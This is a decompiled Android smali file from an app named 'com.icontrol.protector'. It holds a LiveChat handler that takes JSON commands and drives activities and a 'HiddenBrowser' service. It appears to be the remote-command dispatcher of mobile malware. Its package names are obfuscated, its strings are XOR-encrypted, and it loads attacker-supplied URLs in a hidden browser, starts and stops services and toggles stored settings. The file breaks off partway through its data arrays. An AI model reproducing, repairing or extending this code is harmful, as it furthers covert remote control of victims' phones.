.class Lcom/icontrol/protector/LiveChat$a;
.super Lntidisestablish/neumonoul/floccinaucinih/o70;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/LiveChat;->u(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private final a:Ljava/util/Map;

.field private final b:Ljava/util/Map;

.field final synthetic c:Landroid/content/Context;

.field final synthetic d:Lcom/icontrol/protector/LiveChat;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/LiveChat;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    iput-object p2, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-direct {p0}, Lntidisestablish/neumonoul/floccinaucinih/o70;-><init>()V

    new-instance p1, Ljava/util/HashMap;

    invoke-direct {p1}, Ljava/util/HashMap;-><init>()V

    iput-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->a:Ljava/util/Map;

    new-instance p1, Ljava/util/HashMap;

    invoke-direct {p1}, Ljava/util/HashMap;-><init>()V

    iput-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->b:Ljava/util/Map;

    return-void
.end method

.method private g(Lorg/json/JSONObject;)V
    .locals 16

    .line 1
    move-object/from16 v1, p0

    move-object/from16 v0, p1

    const/4 v2, 0x4

    const/16 v3, 0x8

    :try_start_0
    new-array v4, v2, [B

    fill-array-data v4, :array_0

    new-array v5, v3, [B

    fill-array-data v5, :array_1

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x1

    new-array v6, v5, [B

    const/16 v7, -0x29

    const/4 v8, 0x0

    aput-byte v7, v6, v8

    new-array v7, v3, [B

    fill-array-data v7, :array_2

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v6

    const/16 v7, 0x68

    const/4 v9, -0x1

    if-eq v6, v7, :cond_1

    const/16 v7, 0x6e

    if-eq v6, v7, :cond_0

    goto :goto_0

    :cond_0
    new-array v6, v5, [B

    const/16 v7, -0x2b

    aput-byte v7, v6, v8

    new-array v7, v3, [B

    fill-array-data v7, :array_3

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    move v4, v5

    goto :goto_1

    :catch_0
    move-exception v0

    goto/16 :goto_6

    :cond_1
    new-array v6, v5, [B

    const/16 v7, 0x1c

    aput-byte v7, v6, v8

    new-array v7, v3, [B

    fill-array-data v7, :array_4

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    move v4, v8

    goto :goto_1

    :cond_2
    :goto_0
    move v4, v9

    :goto_1
    const/16 v6, 0x31

    const/16 v7, 0x10

    const/4 v10, 0x6

    const/4 v11, 0x7

    const/4 v12, 0x2

    if-eqz v4, :cond_c

    if-eq v4, v5, :cond_3

    goto/16 :goto_7

    :cond_3
    const/4 v4, 0x5

    new-array v13, v4, [B

    fill-array-data v13, :array_5

    new-array v14, v3, [B

    fill-array-data v14, :array_6

    invoke-static {v13, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v13

    new-array v14, v5, [B

    const/16 v15, 0x4b

    aput-byte v15, v14, v8

    new-array v15, v3, [B

    fill-array-data v15, :array_7

    invoke-static {v14, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v0, v13, v14}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    new-array v11, v11, [B

    fill-array-data v11, :array_8

    new-array v14, v3, [B

    fill-array-data v14, :array_9

    invoke-static {v11, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    new-array v14, v5, [B

    const/16 v15, -0x51

    aput-byte v15, v14, v8

    new-array v15, v3, [B

    fill-array-data v15, :array_a

    invoke-static {v14, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v0, v11, v14}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v13}, Ljava/lang/String;->hashCode()I

    move-result v14

    const/16 v15, 0x66

    const/4 v4, 0x3

    if-eq v14, v15, :cond_a

    const/16 v15, 0x73

    if-eq v14, v15, :cond_9

    const/16 v10, 0x75

    if-eq v14, v10, :cond_8

    const/16 v10, 0xc6d

    if-eq v14, v10, :cond_7

    const/16 v10, 0xd84

    if-eq v14, v10, :cond_6

    const/16 v10, 0xe33

    if-eq v14, v10, :cond_5

    const v10, 0x178a1

    if-eq v14, v10, :cond_4

    goto/16 :goto_2

    :cond_4
    new-array v10, v4, [B

    fill-array-data v10, :array_b

    new-array v12, v3, [B

    fill-array-data v12, :array_c

    invoke-static {v10, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_b

    move v9, v2

    goto/16 :goto_2

    :cond_5
    new-array v10, v12, [B

    fill-array-data v10, :array_d

    new-array v12, v3, [B

    fill-array-data v12, :array_e

    invoke-static {v10, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_b

    move v9, v4

    goto/16 :goto_2

    :cond_6
    new-array v10, v12, [B

    fill-array-data v10, :array_f

    new-array v14, v3, [B

    fill-array-data v14, :array_10

    invoke-static {v10, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_b

    move v9, v12

    goto :goto_2

    :cond_7
    new-array v10, v12, [B

    fill-array-data v10, :array_11

    new-array v12, v3, [B

    fill-array-data v12, :array_12

    invoke-static {v10, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_b

    const/4 v9, 0x5

    goto :goto_2

    :cond_8
    new-array v10, v5, [B

    const/16 v12, 0x67

    aput-byte v12, v10, v8

    new-array v12, v3, [B

    fill-array-data v12, :array_13

    invoke-static {v10, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_b

    move v9, v5

    goto :goto_2

    :cond_9
    new-array v12, v5, [B

    const/16 v14, 0x56

    aput-byte v14, v12, v8

    new-array v14, v3, [B

    fill-array-data v14, :array_14

    invoke-static {v12, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v13, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_b

    move v9, v10

    goto :goto_2

    :cond_a
    new-array v10, v5, [B

    aput-byte v12, v10, v8

    new-array v12, v3, [B

    fill-array-data v12, :array_15

    invoke-static {v10, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v13, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v10, :cond_b

    move v9, v8

    :cond_b
    :goto_2
    const-class v10, Lcom/icontrol/protector/WebBrowser;

    const/4 v12, 0x0

    packed-switch v9, :pswitch_data_0

    goto/16 :goto_4

    :pswitch_0
    :try_start_1
    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->V:Ljava/lang/String;

    sget-object v5, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v2, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    goto/16 :goto_4

    :pswitch_1
    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->W:Ljava/lang/String;

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/sq;->a(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_4

    :pswitch_2
    new-array v6, v2, [B

    fill-array-data v6, :array_16

    new-array v7, v3, [B

    fill-array-data v7, :array_17

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    new-array v7, v5, [B

    const/4 v9, -0x6

    aput-byte v9, v7, v8

    new-array v9, v3, [B

    fill-array-data v9, :array_18

    invoke-static {v7, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v6, v7}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-array v7, v2, [B

    fill-array-data v7, :array_19

    new-array v9, v3, [B

    fill-array-data v9, :array_1a

    invoke-static {v7, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v9, v5, [B

    const/16 v10, 0x76

    aput-byte v10, v9, v8

    new-array v10, v3, [B

    fill-array-data v10, :array_1b

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v7, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    new-array v2, v2, [B

    fill-array-data v2, :array_1c

    new-array v9, v3, [B

    fill-array-data v9, :array_1d

    invoke-static {v2, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v5, v5, [B

    const/16 v9, -0x45

    aput-byte v9, v5, v8

    new-array v8, v3, [B

    fill-array-data v8, :array_1e

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v2, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v6, v7}, Lcom/icontrol/protector/a;->g(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v6, v0}, Lcom/icontrol/protector/a;->e(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v6}, Lcom/icontrol/protector/a;->f(Ljava/lang/String;)V

    goto/16 :goto_4

    :pswitch_3
    new-array v2, v2, [B

    fill-array-data v2, :array_1f

    new-array v6, v3, [B

    fill-array-data v6, :array_20

    invoke-static {v2, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v5, v5, [B

    const/16 v6, 0x40

    aput-byte v6, v5, v8

    new-array v6, v3, [B

    fill-array-data v6, :array_21

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v2, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/icontrol/protector/a;->p(Ljava/lang/String;)V

    goto :goto_4

    :pswitch_4
    new-array v2, v2, [B

    fill-array-data v2, :array_22

    new-array v6, v3, [B

    fill-array-data v6, :array_23

    invoke-static {v2, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v5, v5, [B

    aput-byte v7, v5, v8

    new-array v6, v3, [B

    fill-array-data v6, :array_24

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v2, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-virtual {v1, v2, v0}, Lcom/icontrol/protector/LiveChat$a;->x(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_4

    :pswitch_5
    new-instance v12, Landroid/content/Intent;

    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-direct {v12, v0, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    new-array v0, v2, [B

    fill-array-data v0, :array_25

    new-array v2, v3, [B

    fill-array-data v2, :array_26

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v5, [B

    const/16 v5, -0x70

    aput-byte v5, v2, v8

    new-array v5, v3, [B

    fill-array-data v5, :array_27

    invoke-static {v2, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    :goto_3
    invoke-virtual {v12, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    goto :goto_4

    :pswitch_6
    new-instance v12, Landroid/content/Intent;

    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-direct {v12, v0, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    new-array v0, v2, [B

    fill-array-data v0, :array_28

    new-array v2, v3, [B

    fill-array-data v2, :array_29

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v5, [B

    aput-byte v6, v2, v8

    new-array v5, v3, [B

    fill-array-data v5, :array_2a

    invoke-static {v2, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    goto :goto_3

    :goto_4
    if-eqz v12, :cond_17

    new-array v0, v4, [B

    fill-array-data v0, :array_2b

    new-array v2, v3, [B

    fill-array-data v2, :array_2c

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v12, v0, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v0, 0x10000000

    invoke-virtual {v12, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x10000

    invoke-virtual {v12, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x800000

    invoke-virtual {v12, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-virtual {v0, v12}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_7

    :cond_c
    new-array v4, v2, [B

    fill-array-data v4, :array_2d

    new-array v13, v3, [B

    fill-array-data v13, :array_2e

    invoke-static {v4, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v13, v5, [B

    const/16 v14, 0x4e

    aput-byte v14, v13, v8

    new-array v14, v3, [B

    fill-array-data v14, :array_2f

    invoke-static {v13, v14}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v0, v4, v13}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v13

    const/16 v14, 0x30

    if-eq v13, v14, :cond_f

    if-eq v13, v6, :cond_e

    const/16 v6, 0x33

    if-eq v13, v6, :cond_d

    goto :goto_5

    :cond_d
    new-array v6, v5, [B

    const/16 v13, 0x60

    aput-byte v13, v6, v8

    new-array v13, v3, [B

    fill-array-data v13, :array_30

    invoke-static {v6, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_10

    move v9, v12

    goto :goto_5

    :cond_e
    new-array v6, v5, [B

    const/4 v13, -0x3

    aput-byte v13, v6, v8

    new-array v13, v3, [B

    fill-array-data v13, :array_31

    invoke-static {v6, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_10

    move v9, v8

    goto :goto_5

    :cond_f
    new-array v6, v5, [B

    const/16 v13, -0x7d

    aput-byte v13, v6, v8

    new-array v13, v3, [B

    fill-array-data v13, :array_32

    invoke-static {v6, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    if-eqz v4, :cond_10

    move v9, v5

    :cond_10
    :goto_5
    const-class v4, Lcom/icontrol/protector/HiddenBrowser;

    if-eqz v9, :cond_13

    if-eq v9, v5, :cond_12

    if-eq v9, v12, :cond_11

    goto/16 :goto_7

    :cond_11
    :try_start_2
    invoke-static {}, Lcom/icontrol/protector/HiddenBrowser;->p()Lcom/icontrol/protector/HiddenBrowser;

    move-result-object v2

    if-eqz v2, :cond_17

    new-array v4, v11, [B

    fill-array-data v4, :array_33

    new-array v5, v3, [B

    fill-array-data v5, :array_34

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v5, v7, [B

    fill-array-data v5, :array_35

    new-array v6, v3, [B

    fill-array-data v6, :array_36

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v4, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/icontrol/protector/n;->w(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v4, v10, [B

    fill-array-data v4, :array_37

    new-array v5, v3, [B

    fill-array-data v5, :array_38

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    iget-object v4, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-virtual {v2, v0, v4}, Lcom/icontrol/protector/HiddenBrowser;->o([Ljava/lang/String;Landroid/content/Context;)V

    goto/16 :goto_7

    :cond_12
    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->U:Ljava/lang/String;

    sget-object v5, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v2, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    new-instance v0, Landroid/content/Intent;

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-direct {v0, v2, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-virtual {v2, v0}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    goto/16 :goto_7

    :cond_13
    new-array v6, v11, [B

    fill-array-data v6, :array_39

    new-array v7, v3, [B

    fill-array-data v7, :array_3a

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/16 v7, 0x24

    new-array v7, v7, [B

    fill-array-data v7, :array_3b

    new-array v9, v3, [B

    fill-array-data v9, :array_3c

    invoke-static {v7, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v6, v7}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/icontrol/protector/n;->w(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v6, v10, [B

    fill-array-data v6, :array_3d

    new-array v7, v3, [B

    fill-array-data v7, :array_3e

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    aget-object v6, v0, v8

    aget-object v0, v0, v5

    new-array v7, v11, [B

    fill-array-data v7, :array_3f

    new-array v9, v3, [B

    fill-array-data v9, :array_40

    invoke-static {v7, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_14

    new-array v7, v3, [B

    fill-array-data v7, :array_41

    new-array v9, v3, [B

    fill-array-data v9, :array_42

    invoke-static {v7, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_14

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    new-array v9, v11, [B

    fill-array-data v9, :array_43

    new-array v10, v3, [B

    fill-array-data v10, :array_44

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    :cond_14
    iget-object v7, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-virtual {v7}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-static {v7, v4}, Lntidisestablish/neumonoul/floccinaucinih/q8;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v7

    if-nez v7, :cond_16

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v5, Lntidisestablish/neumonoul/floccinaucinih/ab;->U:Ljava/lang/String;

    sget-object v7, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v2, v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    new-instance v2, Landroid/content/Intent;

    iget-object v5, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-virtual {v5}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-direct {v2, v5, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    new-array v4, v3, [B

    fill-array-data v4, :array_45

    new-array v5, v3, [B

    fill-array-data v5, :array_46

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    new-array v4, v12, [B

    fill-array-data v4, :array_47

    new-array v5, v3, [B

    fill-array-data v5, :array_48

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x1a

    if-lt v0, v4, :cond_15

    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/on;->a(Lcom/icontrol/protector/LiveChat;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_7

    :cond_15
    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-virtual {v0, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_7

    :cond_16
    invoke-static {}, Lcom/icontrol/protector/HiddenBrowser;->p()Lcom/icontrol/protector/HiddenBrowser;

    move-result-object v0

    if-eqz v0, :cond_17

    new-array v4, v12, [Ljava/lang/String;

    new-array v2, v2, [B

    fill-array-data v2, :array_49

    new-array v7, v3, [B

    fill-array-data v7, :array_4a

    invoke-static {v2, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v4, v8

    aput-object v6, v4, v5

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-virtual {v0, v4, v2}, Lcom/icontrol/protector/HiddenBrowser;->o([Ljava/lang/String;Landroid/content/Context;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_7

    :goto_6
    const/16 v2, 0xd

    new-array v2, v2, [B

    fill-array-data v2, :array_4b

    new-array v3, v3, [B

    fill-array-data v3, :array_4c

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_17
    :goto_7
    return-void

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch

    :array_0
    .array-data 1
        0x6t
        -0x50t
        0xft
        -0x44t
    .end array-data

    :array_1
    .array-data 1
        0x75t
        -0x3bt
        0x6dt
        -0x21t
        0x3dt
        0x63t
        0x4t
        0x52t
    .end array-data

    :array_2
    .array-data 1
        -0x19t
        0x39t
        -0x58t
        -0x4ft
        0x2et
        0x28t
        0x22t
        0x2bt
    .end array-data

    :array_3
    .array-data 1
        -0x45t
        0xet
        0x27t
        0x57t
        0x5t
        0x5bt
        0x1ct
        0xft
    .end array-data

    :array_4
    .array-data 1
        0x74t
        -0x2ct
        -0x14t
        -0x5dt
        -0x22t
        0x0t
        -0x13t
        -0x1at
    .end array-data

    :array_5
    .array-data 1
        -0x41t
        -0x4ft
        -0x49t
        -0x27t
        0x7dt
    .end array-data

    nop

    :array_6
    .array-data 1
        -0x2dt
        -0x3bt
        -0x32t
        -0x57t
        0x18t
        -0x6ct
        0x1ct
        -0x4at
    .end array-data

    :array_7
    .array-data 1
        0x7bt
        0x5dt
        -0x74t
        0x15t
        -0x2et
        0x66t
        0x51t
        0x6bt
    .end array-data

    :array_8
    .array-data 1
        0x34t
        -0x5ct
        0x7bt
        0x6dt
        0x13t
        0xdt
        0x58t
    .end array-data

    :array_9
    .array-data 1
        0x51t
        -0x24t
        0xft
        0x9t
        0x72t
        0x79t
        0x39t
        -0x3bt
    .end array-data

    :array_a
    .array-data 1
